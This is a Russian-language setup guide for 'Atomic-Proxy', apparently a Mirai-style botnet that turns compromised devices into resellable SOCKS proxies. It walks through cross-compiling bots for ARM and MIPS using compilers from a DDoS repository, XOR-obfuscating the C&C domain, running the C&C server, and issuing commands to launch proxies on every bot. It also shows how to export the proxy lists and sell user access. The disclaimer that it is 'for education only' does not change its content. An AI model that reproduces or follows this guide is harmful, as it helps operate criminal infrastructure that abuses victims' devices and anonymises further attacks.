# Atomic-Proxy - Setup Guide

## Быстрый старт

### 1. Подготовка системы

```bash
# Обновление системы
sudo apt-get update && sudo apt-get upgrade -y

# Установка зависимостей
sudo apt-get install -y gcc g++ sqlite3 git

# Установка Go (если не установлен)
cd /tmp
wget https://dl.google.com/go/go1.20.linux-amd64.tar.gz
sudo tar -C /usr/local -xzf go1.20.linux-amd64.tar.gz

# Настройка переменных окружения
echo 'export PATH=$PATH:/usr/local/go/bin' >> ~/.bashrc
echo 'export GOPATH=$HOME/go' >> ~/.bashrc
source ~/.bashrc
```

### 2. Установка кросс-компиляторов (опционально)

Для компиляции ботов под разные архитектуры:

```bash
sudo mkdir -p /etc/xcompile
cd /etc/xcompile

# Загрузка компиляторов для ARM, MIPS, x86 и т.д.
wget https://github.com/R00tS3c/DDOS-RootSec/raw/master/uclib-cross-compilers/cross-compiler-armv7l.tar.bz2
tar -jxf cross-compiler-armv7l.tar.bz2

# Повторить для других архитектур...
```

### 3. Настройка C&C домена

```bash
cd tools

# Компиляция XOR утилиты
gcc xor.c -o xor

# Генерация XOR строки для вашего домена
./xor string your-cnc-domain.com

# Скопировать вывод и добавить в bot/table.c
# Пример вывода:
# "\xAB\xCD\xEF\x12\x34\x56..." 17
```

Отредактировать `bot/table.c`:

```c
add_entry(TABLE_CNC_DOMAIN, "\xAB\xCD\xEF\x12\x34\x56...", 17);
```

### 4. Инициализация базы данных

```bash
cd assets

# Создание базы данных
sqlite3 data.db < init_proxy_db.sql

# Проверка
sqlite3 data.db "SELECT * FROM users;"

# ВАЖНО: Сменить пароль администратора!
sqlite3 data.db "UPDATE users SET password='NEW_STRONG_PASSWORD' WHERE username='root';"
```

### 5. Настройка конфигурации

Отредактировать `assets/server.toml`:

```toml
[templates.server]
protocol = "tcp"
listener = ":666"          # Порт для админ-панели

[templates.slaves]
protocol = "tcp"
listener = ":1995"         # Порт для подключения ботов

[templates.api]
listener = "0.0.0.0:81"   # Порт для API
tls = false                # Включить TLS (рекомендуется)
key = "api.key"
cert = "api.cert"

[templates.database]
local = "./assets/data.db"
```

### 6. Компиляция

```bash
# Компиляция C&C сервера
cd cnc
go mod init atomic-proxy
go get github.com/gorilla/mux
go get github.com/mattn/go-sqlite3
go get github.com/alexeyco/simpletable
go get github.com/naoina/toml
go build -o ../atomic-cnc

# Компиляция ботов
cd ..
chmod +x build.sh
./build.sh

# Результат в папке release/
ls -lh release/
```

### 7. Запуск C&C сервера

```bash
# Увеличение лимитов
ulimit -n 999999
ulimit -u 999999

# Запуск в screen
screen -S atomic-cnc
./atomic-cnc

# Или в фоне
nohup ./atomic-cnc > cnc.log 2>&1 &
```

### 8. Подключение к админ-панели

```bash
telnet localhost 666

# Или через SSH
ssh -L 666:localhost:666 user@your-server
telnet localhost 666
```

Войдите с учетными данными:
- Username: `root`
- Password: `root@123` (или измененный)

## Основные команды админ-панели

### Управление прокси

```bash
# Запустить прокси на всех ботах
proxy start port=1080 auth=false maxconns=50

# Остановить все прокси
proxy stop

# Список активных прокси
proxy list

# Статистика
proxy stats

# Экспорт списка прокси
proxy export
```

### Управление пользователями

```bash
# Создать пользователя
create newuser password123 30    # 30 дней доступа

# Управление правами
admin true username
api true username
reseller true username

# Изменение лимитов
maxtime 3600 username
conns 5 username
days 30 username

# Удаление
remove username
```

### Просмотр информации

```bash
# Подключенные боты
bots

# Активные сессии
sessions

# Все пользователи
users

# Помощь
help
```

## API использование

### Получить список прокси

```bash
curl "http://your-server:81/proxies?user=root&password=root@123"
```

Ответ:
```json
{
  "success": true,
  "count": 150,
  "proxies": [
    {
      "ip": "192.168.1.100",
      "port": 1080,
      "country": "Unknown",
      "status": "running",
      "connections_active": 5
    }
  ]
}
```

### Запустить прокси

```bash
curl "http://your-server:81/proxy/start?user=root&password=root@123&port=1080"
```

### Получить статистику

```bash
curl "http://your-server:81/proxy/stats?user=root&password=root@123"
```

### Экспорт списка (текст)

```bash
# Формат ip:port
curl "http://your-server:81/proxy/list?user=root&password=root@123&format=ip:port"

# Формат ip:port:user:pass
curl "http://your-server:81/proxy/list?user=root&password=root@123&format=ip:port:user:pass"

# Сохранить в файл
curl "http://your-server:81/proxy/list?user=root&password=root@123&format=ip:port" > proxies.txt
```

## Использование прокси

### С curl

```bash
curl -x socks5://192.168.1.100:1080 https://api.ipify.org
curl -x socks5://192.168.1.100:1080 https://ifconfig.me
```

### С Python

```python
import requests

proxies = {
    'http': 'socks5://192.168.1.100:1080',
    'https': 'socks5://192.168.1.100:1080'
}

response = requests.get('https://api.ipify.org', proxies=proxies)
print(f"IP: {response.text}")
```

### С Node.js

```javascript
const axios = require('axios');
const SocksProxyAgent = require('socks-proxy-agent');

const proxy = 'socks5://192.168.1.100:1080';
const agent = new SocksProxyAgent(proxy);

axios.get('https://api.ipify.org', { httpAgent: agent, httpsAgent: agent })
  .then(response => console.log('IP:', response.data))
  .catch(error => console.error('Error:', error));
```

### В браузере (Firefox)

1. Настройки → Параметры сети
2. Ручная настройка прокси
3. SOCKS Host: `192.168.1.100`
4. Port: `1080`
5. SOCKS v5: ✓

## Безопасность

### Настройка firewall

```bash
# Разрешить только ваш IP для админ-панели
sudo ufw allow from YOUR_IP to any port 666
sudo ufw deny 666

# Разрешить API (с ограничениями)
sudo ufw allow 81

# Разрешить подключение ботов
sudo ufw allow 1995
```

### Включение TLS для API

```bash
# Генерация сертификата
openssl req -x509 -newkey rsa:4096 \
  -keyout assets/api.key \
  -out assets/api.cert \
  -days 365 -nodes \
  -subj "/CN=your-domain.com"

# В server.toml
[templates.api]
tls = true
key = "assets/api.key"
cert = "assets/api.cert"
```

### Смена паролей

```bash
sqlite3 assets/data.db

# Сменить пароль админа
UPDATE users SET password='NEW_PASSWORD' WHERE username='root';

# Отключить тестовых пользователей
DELETE FROM users WHERE username != 'root';
```

### Ограничение доступа к API

```bash
# В базе данных оставить API доступ только нужным пользователям
UPDATE users SET api=0 WHERE username != 'root';
```

## Мониторинг

### Логи

```bash
# C&C логи
tail -f cnc.log

# Системные логи
journalctl -u atomic-cnc -f
```

### Системные ресурсы

```bash
# CPU и память
htop

# Сетевые соединения
netstat -an | grep :1995 | wc -l    # Подключенные боты
netstat -an | grep :1080 | wc -l    # Активные прокси соединения

# Дисковое пространство
df -h
```

### База данных

```bash
sqlite3 assets/data.db

# Количество прокси
SELECT COUNT(*) FROM proxy_stats WHERE status='running';

# Статистика по странам
SELECT country, COUNT(*) FROM proxy_stats GROUP BY country;

# Топ прокси по трафику
SELECT ip, bytes_sent, bytes_received 
FROM proxy_stats 
ORDER BY (bytes_sent + bytes_received) DESC 
LIMIT 10;
```

## Устранение проблем

### Боты не подключаются

1. Проверить домен в `bot/table.c`
2. Проверить firewall на порту 1995
3. Проверить, что C&C запущен
4. Проверить DNS резолвинг

```bash
# Проверка порта
nc -zv your-server.com 1995

# Проверка DNS
nslookup your-cnc-domain.com
```

### Прокси не запускаются

1. Проверить, что порт не занят
2. Проверить права бота на bind порта
3. Проверить firewall на порту прокси

```bash
# На боте
netstat -an | grep :1080
lsof -i :1080
```

### API не отвечает

1. Проверить, что сервис запущен
2. Проверить порт 81
3. Проверить аутентификацию

```bash
# Проверка API
curl -v http://localhost:81/health

# Проверка аутентификации
curl "http://localhost:81/proxies?user=root&password=root@123"
```

### Низкая производительность

1. Уменьшить `maxconns` на бота
2. Увеличить системные лимиты
3. Оптимизировать TCP настройки

```bash
# Увеличить лимиты
ulimit -n 999999

# TCP оптимизация
sysctl -w net.ipv4.tcp_fin_timeout=15
sysctl -w net.ipv4.tcp_tw_reuse=1
sysctl -w net.core.somaxconn=4096
```

## Обновление

```bash
# Остановить C&C
pkill atomic-cnc

# Обновить код
git pull

# Пересобрать
cd cnc && go build -o ../atomic-cnc
cd .. && ./build.sh

# Запустить заново
./atomic-cnc
```

## Резервное копирование

```bash
# Бэкап базы данных
sqlite3 assets/data.db ".backup 'backup_$(date +%Y%m%d).db'"

# Бэкап конфигурации
tar -czf config_backup.tar.gz assets/ cnc/

# Восстановление
cp backup_YYYYMMDD.db assets/data.db
```

## Поддержка

Это учебный проект. Для вопросов об образовательном использовании:
- Откройте issue на GitHub
- Изучите документацию в PROXY_GUIDE.md

**ВАЖНО**: Используйте только для легальных образовательных целей!
